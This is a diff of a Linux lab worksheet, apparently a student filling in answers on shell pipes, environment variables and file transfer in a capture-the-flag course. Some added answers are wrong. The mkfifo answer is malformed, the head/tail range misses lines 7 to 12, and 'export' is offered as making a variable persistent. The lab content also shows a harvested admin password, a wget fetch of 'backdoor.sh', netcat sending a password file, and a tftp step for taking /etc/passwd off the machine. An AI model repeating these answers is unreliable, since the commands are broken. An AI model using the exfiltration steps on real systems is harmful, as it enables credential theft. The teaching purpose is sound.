@@ -133,19 +133,16 @@ Read the following [article](https://ryanstutorials.net/linuxtutorial/piping.php
     > Your command : find /etc -name *conf* 2> /dev/null
 
 1. Now redirect the standard output and the error output of the ``find /etc -name *conf*`` command to two different files (std.out and std.err)
-    > Your command :
-
-1. What does the mkfifo command do?
-    > No answer required
+    > Your command :  find /etc -name *conf* 2> errors.txt 1> output.txt
 
 1. Create a pipe named "MyNammedPipe". Then execute the pwd command which will transmit the data in this pipe. Then use the cat command to read the contents of your "MyNammedPipe" pipe.
-    > Your commands :
+    > Your commands : mkfifo MyNamedPipe pwd > MyNamedPipe && cat MyNamedPipe
 
 1. With cat command, add number the lines in the file /etc/passwd with the command ``nl``
-    > Your commands :
+    > Your commands : cat /etc/passwd | nl
     
 1. Using the previous nl command, the head and tail commands, display the lines of /etc/passwd between line 7 and line 12
-    > Your commands :
+    > Your commands : nl /etc/passwd | head -n 11 | tail -n 4
 
 
 
@@ -163,16 +160,26 @@ Variables are made up of names that are assigned values. For example, a French u
 
 The meaning of an environment variable and the type of value that can be assigned to it are determined by the application that uses it. There are a small number of well-known environment variables, whose meaning and type of value are well determined, and which are used by many applications.
 
-### 6. Process
 
-#### Program VS Process
-A process is a program that executes and that also has its ordinal counter, its registers and its variables; this is the subtlety between program and process. The difference between a process and a program is thin: the process has the program but also the current state of this one in the memory of the computer. The program is ultimately the set of files that, when executed, become the process.
+## Exercises
 
-#### What is a PID ?
-A PID (that is, a process identification number) is an identification number that is automatically assigned to each process when it is created on a Unix-like operating system. A process is a running (i.e., executing) instance of a program. Each process is guaranteed a unique PID, which is always a non-negative integer.
+1. On your student machine what is the value of the FLAG environment variable ?
 
-Source: https://frameboxxindore.com/linux/what-is-pid-in-linux.html
+> FLAG : BC{EXPORT_B4SH_FLAG}
 
+2. Currently if you notice your machine, the variable you have created will be deleted. What should you do to make your variable persistent? (With a Bash shell).
+
+> Commands : export command=something
+
+3.  **From a hacker's perspective**, look for information that might be useful to you in the ``.history`` file.
+
+> Your answer : 119 telnet 10.21.55.98 -login admin -pass MyP4ssW0rDiS3CuR3!
+
+4.  **From an analyst's perspective**, look for information that might be useful to you in the ``.history`` file.
+
+> Your answer : 95 wget http://10.88.56.53/backdoor.sh and the following lines
+
+[Next](./Protocols_and_Servers.md)
 
 
 
@@ -267,5 +274,5 @@ Learning how to transfer files between files different machines.
     > ON SENDING END : nc -w 3 [destination] 1234 < password.txt
 
 1. On the student machine,  transfer ``/etc/passwd`` file to your kali machine with tftp
-    > Your commands : 
+    > Your commands :  tftp 10.12.172.105
 
